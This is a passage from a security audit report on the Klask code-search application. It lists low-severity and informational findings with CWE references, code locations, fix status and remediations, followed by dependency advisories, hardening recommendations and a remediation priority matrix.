**Remediation**: The Rust `regex` crate (already a dependency) uses an NFA/DFA engine immune to ReDoS. Verify that Tantivy's `RegexQuery` uses this engine; if so, the validator is unnecessary. If not, switch to the `regex` crate for user-provided patterns.

---

#### KLASK-BE-017 — Rate Limiter Stores State In-Memory Only

- **Severity**: Low
- **CWE**: CWE-799 (Improper Control of Interaction Frequency)
- **Location**: `klask-rs/src/api/auth.rs:407-439`
- **Status**: Open

**Description**: The `delete_account_rate_limiter` is a `HashMap<String, (u32, Instant)>` in application memory. It resets on every restart and cannot be shared across multiple instances. In a multi-replica Kubernetes deployment, the limit is effectively multiplied by the replica count.

**Remediation**: For multi-instance deployments, move rate limit state to Redis or the PostgreSQL database. A single-instance deployment can keep the HashMap approach.

---

#### KLASK-BE-018 — Password Policy Not Applied to Admin-Created Users

- **Severity**: Low
- **CWE**: CWE-521 (Weak Password Requirements)
- **Location**: `klask-rs/src/api/users.rs`
- **Status**: Fixed — 8591bcf

**Description**: Admin-created users via `POST /api/users` have no password validation — any string passes. (See also KLASK-BE-014.)

**Remediation**: Apply `validate_password_strength()` to `CreateUserRequest` processing.

---

#### KLASK-INFRA-013 — No Audit Logging for Sensitive Operations

- **Severity**: Low
- **CWE**: CWE-778 (Insufficient Logging)
- **Location**: Application-wide
- **Status**: Fixed — a22da11 (placeholder in Helm values; full audit log implementation remains Open)

**Description**: No structured audit trail exists for: authentication events, repository additions/deletions, search queries, admin actions, token generation. Incident detection and forensics are severely limited.

**Remediation**: Implement an audit log table in PostgreSQL (`audit_events`) or emit structured JSON events to stdout for collection by a log aggregator. Log at minimum: `AUTHENTICATION`, `REPOSITORY_MODIFIED`, `ADMIN_ACTION`, `SEARCH` (optional).

---

#### KLASK-INFRA-014 — SECURITY.md Incomplete

- **Severity**: Low
- **CWE**: N/A
- **Location**: `SECURITY.md`
- **Status**: Fixed — 77abee75

**Description**: `SECURITY.md` contains a single sentence. It is missing: disclosure policy, contact method (email + PGP), scope, SLA for fixes, known limitations.

**Remediation**: Add a responsible disclosure policy with a contact email, response timeline, and scope definition.

---

#### KLASK-INFRA-015 — Docker Compose Missing Resource Limits

- **Severity**: Low
- **CWE**: CWE-770 (Allocation of Resources Without Limits)
- **Location**: `docker-compose.dev.yml`
- **Status**: Open

**Description**: No `mem_limit` or `cpus` on any service. A crawler running on a large repository can exhaust all available memory/CPU on the developer machine.

**Remediation**: Add resource limits to `docker-compose.dev.yml` for backend and crawler processes.

---

#### KLASK-INFRA-016 — Dockerfile Base Images Not Pinned by Digest

- **Severity**: Low
- **CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Location**: `klask-rs/Dockerfile:2`, `klask-react/Dockerfile:2`
- **Status**: Fixed — a5a999d (documented; digest pinning remains Open)

**Description**: `rust:slim-trixie` and `node:22-alpine` tags are mutable. Builds may not be reproducible across time.

**Remediation**: Pin base images by digest: `FROM rust:slim-trixie@sha256:<digest>`.

---

### Informational

---

#### KLASK-BE-019 — JWT Secret Minimum Length Not Enforced

- **Severity**: Informational
- **CWE**: CWE-334 (Small Space of Random Values)
- **Location**: `klask-rs/src/config.rs:80-87`
- **Status**: Fixed — f5c98b3

**Description**: `JWT_SECRET` is validated as non-empty but has no minimum length check. A 1-character secret is accepted.

**Remediation**: Enforce minimum 32 bytes (consistent with `ENCRYPTION_KEY`'s 16-char minimum, but stronger).

---

#### KLASK-BE-020 — `OptionalUser` Extractor Silently Swallows Auth Errors

- **Severity**: Informational
- **CWE**: CWE-390
- **Location**: `klask-rs/src/auth/extractors.rs:80-94`
- **Status**: Open

**Description**: `OptionalUser` (currently `#[allow(dead_code)]`) converts expired/invalid tokens to `None` instead of returning 401. A future developer could use this to accidentally allow expired-token requests through as anonymous.

**Remediation**: Remove the extractor entirely if unused. If needed, document clearly that it treats invalid tokens as anonymous (potentially undesired behavior).

---

#### KLASK-BE-021 — Admin-Only Password Verification Oracle Endpoint

- **Severity**: Informational
- **CWE**: CWE-916
- **Location**: `klask-rs/src/api/users.rs:316-334`
- **Status**: Fixed — 2f36482

**Description**: `POST /api/users/verify-password` allows an admin to verify arbitrary (password, hash) pairs using the server's Argon2 implementation — effectively a hash-cracking oracle using server CPU.

**Remediation**: Remove this endpoint. It has no legitimate business use case distinct from the standard authentication flow.

---

#### KLASK-FE-009 — Search History Stored in localStorage

- **Severity**: Informational
- **CWE**: CWE-922
- **Location**: `klask-react/src/hooks/useSearch.ts:337-378`
- **Status**: Fixed — 29c7cf7

**Description**: Search history is stored in plaintext in localStorage. An attacker with physical or XSS access can read the user's search patterns.

**Remediation**: Use `sessionStorage` to clear history on browser close, or provide an explicit "clear history" button.

---

#### KLASK-FE-010 — Runtime Config Publicly Accessible

- **Severity**: Informational
- **CWE**: CWE-200
- **Location**: `klask-react/public/runtime-config.js`
- **Status**: Open

**Description**: `runtime-config.js` is publicly accessible. Currently only contains `VITE_API_BASE_URL`. If secrets are ever added here accidentally, they will be exposed.

**Remediation**: Document that only non-sensitive config may be placed in this file. Internal URLs should be served via `/api/config` (authenticated) if they are sensitive.

---

#### KLASK-INFRA-017 — No Pod Security Standards Enforcement

- **Severity**: Informational
- **CWE**: N/A
- **Location**: `charts/klask/`
- **Status**: Open

**Description**: No `pod-security.kubernetes.io/enforce` label on the target namespace. Relying solely on container-level `securityContext` without namespace-level enforcement.

**Remediation**: Document that the target namespace must have `pod-security.kubernetes.io/enforce: restricted`. Add a Helm note or pre-install hook to check.

---

## Dependency Vulnerabilities

### Cargo (Rust)

| ID | Package | Title | Severity |
|----|---------|-------|----------|
| RUSTSEC-2023-0071 | `rsa` | Marvin Attack: potential key recovery via timing sidechannels | High (CVSS 5.9) |
| RUSTSEC-2026-0098 | `rustls-webpki` | Name constraints for URI names incorrectly accepted | Unknown |
| RUSTSEC-2026-0099 | `rustls-webpki` | Name constraints accepted for wildcard names | Unknown |
| RUSTSEC-2026-0104 | `rustls-webpki` | Reachable panic in certificate revocation list parsing | Unknown |

**Unsound warnings:**
| ID | Package | Title |
|----|---------|-------|
| RUSTSEC-2026-0002 | `lru` | `IterMut` violates Stacked Borrows |
| RUSTSEC-2026-0097 | `rand` | Unsound with custom logger using `rand::rng()` |

**Note on `rsa`**: This crate is a transitive dependency. If Klask does not use RSA operations directly, the exposure is limited to what Tantivy or other deps do internally. Assess via `cargo tree -i rsa`.

**Remediation**: Run `cargo update` to pull latest patch versions of affected crates. Check if newer versions of `tantivy`, `sqlx`, or other direct deps have resolved these transitives.

### npm (Frontend)

| Package | Severity | Advisory |
|---------|----------|----------|
| `ajv` | Moderate | ReDoS via `$data` option (GHSA-2g4f-4pwh-qvx6) |
| `brace-expansion` | Moderate | Zero-step sequence → process hang (GHSA-f886-m6hf-6m8v) |

Both are transitive (build tooling), not runtime. `npm audit fix` should resolve them.

---

## Hardening Recommendations (Non-Vulnerability)

These are not exploitable vulnerabilities but would meaningfully improve the security posture:

1. **Implement JWT refresh tokens**: Short-lived access tokens (15 min) + long-lived refresh tokens (7 days) stored HttpOnly. See KLASK-FE-002.

2. **Add `seccompProfile` to pod specs**: Add `securityContext.seccompProfile.type: RuntimeDefault` to all containers in Helm templates.

3. **Add `capabilities.drop: [ALL]` to container securityContext**: Already has `readOnlyRootFilesystem: true` and `runAsNonRoot: true` — add capability dropping.

4. **Rotate ENCRYPTION_KEY support**: Implement key versioning in the encryption service so tokens encrypted with an old key can be re-encrypted without requiring immediate rotation of all tokens.

5. **Add `cargo-audit` and `npm audit` to CI**: Neither is currently in the GitHub Actions pipeline (Trivy scans images, but not Rust/JS dep trees).

6. **Add `git-secrets` or `gitleaks` pre-commit hook**: Prevent accidental commitment of credentials.

7. **Document threat model**: Create `docs/THREAT_MODEL.md` covering: trust boundaries, data classification, attack scenarios, mitigations in place vs. outstanding.

---

## Remediation Priority Matrix

| Priority | Findings | Action |
|----------|---------|--------|
| **P0 — Before any production deployment** | BE-001, FE-003, FE-005, BE-002, INFRA-002, INFRA-003, INFRA-004 | Fix immediately |
| **P1 — Next sprint** | BE-003, BE-004, BE-005, FE-001, FE-002, FE-004, INFRA-001, INFRA-009 | Fix in upcoming release |
| **P2 — This quarter** | BE-006 through BE-014, FE-006 through FE-008, INFRA-005 through INFRA-012 | Plan and schedule |
| **P3 — Backlog** | All Low and Informational findings | Track, address opportunistically |
